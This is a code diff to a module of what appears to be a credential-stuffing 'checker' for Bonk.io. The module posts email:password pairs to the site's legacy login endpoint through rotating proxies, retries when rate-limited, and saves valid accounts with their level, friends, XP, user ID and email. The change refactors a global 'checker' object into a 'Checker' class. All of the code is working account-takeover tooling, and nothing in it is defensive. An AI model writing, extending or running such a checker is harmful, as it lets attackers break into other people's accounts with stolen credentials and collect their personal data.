@@ -1,4 +1,4 @@
-from __main__ import checker
+from modules.variables import Checker
 from modules.functions import set_proxy,log,save,bad_proxy
 from requests import post
 from math import sqrt
@@ -8,11 +8,13 @@ def check(email:str,password:str):
     
     username = email.split("@")[0] if "@" in email else email
     
-    while retries != checker.retries:
+    while retries != Checker.retries:
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
+
         data = f"username={username}&password={password}"
         try:
-            a = post("https://bonk2.io/scripts/login_legacy.php",data=data,proxies=set_proxy(proxy),timeout=checker.timeout).json()
+            a = post("https://bonk2.io/scripts/login_legacy.php",data=data,proxies=proxy_set,timeout=Checker.timeout).json()
             if a["r"] == "fail":
                 if a.get("e") == "ratelimited":
                     raise
@@ -34,17 +36,17 @@ def check(email:str,password:str):
                     level = int(sqrt(int(xp)/100))
                 else:
                     level = 0
-                if not checker.cui:
+                if not Checker.cui:
                     log("good",username+":"+password,"Bonk.io")
-                save("BonkIO","good",checker.time,username+":"+password+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id} | Email: {email}")
-                checker.good += 1
-                checker.cpm += 1
+                save("BonkIO","good",Checker.time,username+":"+password+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id} | Email: {email}")
+                Checker.good += 1
+                Checker.cpm += 1
                 return
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",username+":"+password,"Bonk.io")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
